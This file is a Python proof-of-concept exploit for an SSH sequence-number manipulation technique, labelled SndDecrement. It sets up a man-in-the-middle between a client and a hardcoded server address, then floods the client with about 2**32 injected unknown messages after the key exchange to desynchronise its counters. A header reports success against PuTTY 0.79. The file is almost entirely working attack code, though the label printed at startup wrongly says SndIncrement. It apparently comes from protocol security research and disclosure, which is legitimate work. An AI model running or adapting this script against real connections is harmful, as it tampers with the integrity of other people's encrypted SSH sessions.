#!/usr/bin/python3
import sys
from binascii import unhexlify
from common import is_root, contains_newkeys, run_tcp_mitm
from tqdm import trange
from time import sleep

#####################################################################################
## Proof of Concept for the SndDecrement technique                                 ##
##                                                                                 ##
## Tested successfully against:                                                    ##
## - PuTTY 0.79 (OpenSSH 9.4p1 Server)                                             ##
##                                                                                 ##
## Tested unsuccessfully:                                                          ##
## - AsyncSSH / libssh (Timeouts)                                                  ##
## - OpenSSH (Wrap-Around Detection)                                               ##
## - dropbear (Disconnect on unknown message)                                      ##
##                                                                                 ##
## Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0    ##
#####################################################################################

INTERFACE='eth0'
TARGET_PORT=22
TARGET_IP = '192.168.22.10'

rogue_unknown_msg = unhexlify('0000000C060900000000000000000000')
rogue_msg_ignore = unhexlify('0000000C060200000000000000000000')
technique_in_progress = False
def inject_snddecrement(in_socket, out_socket):
    global technique_in_progress
    try:
        while True:
            data = in_socket.recv(4096)
            if contains_newkeys(data):
                print("[+] SSH_MSG_NEWKEYS sent by server identified!")
                technique_in_progress = True
                print("[+] Injecting 2**32 - 1 unknown messages to decrement C.Snd!")
                for _ in trange(2**32):
                    out_socket.send(rogue_unknown_msg)
                print("[+] Injecting SSH_MSG_IGNORE to fix C.Rcv!")
                #out_socket.send(rogue_msg_ignore)
                print("[+] Injection done, cooling down before continuing to forward traffic.")
                # Rough workaround to avoid forwarding any unimplemented messages to the server
                sleep(3)
                technique_in_progress = False
            if len(data) == 0:
                break
            out_socket.send(data)
    except ConnectionResetError:
        print("[!] Socket connection has been reset. Closing sockets.")
    except OSError:
        print("[!] Sockets closed by another thread. Terminating pipe_socket_stream thread.")
    in_socket.close()
    out_socket.close()

def pipe_discard_during_technique(in_socket, out_socket):
    global technique_in_progress
    try:
        while True:
            data = in_socket.recv(4096)
            if len(data) == 0:
                break
            # Rough but good enough for a PoC.
            # This may drop valid messages send by the client. However, since the server sends the key exchange reply
            # and new keys together, it is very unlikely that the key exchange has completed yet.
            if not technique_in_progress:
                out_socket.send(data)
    except ConnectionResetError:
        print("[!] Socket connection has been reset. Closing sockets.")
    except OSError:
        print("[!] Sockets closed by another thread. Terminating pipe_socket_stream thread.")
    in_socket.close()
    out_socket.close()

if __name__ == '__main__':
    if not is_root():
        print("[!] Script must be run as root!")
        sys.exit(1)

    print("--- Proof of Concept for SndIncrement technique ---")
    print("[+] WARNING: Connection failure will occur, this is expected as sequence numbers will not match (C.Snd = S.Rcv - 1).")
    run_tcp_mitm(TARGET_IP, TARGET_PORT, forward_server_to_client=inject_snddecrement, forward_client_to_server=pipe_discard_during_technique)
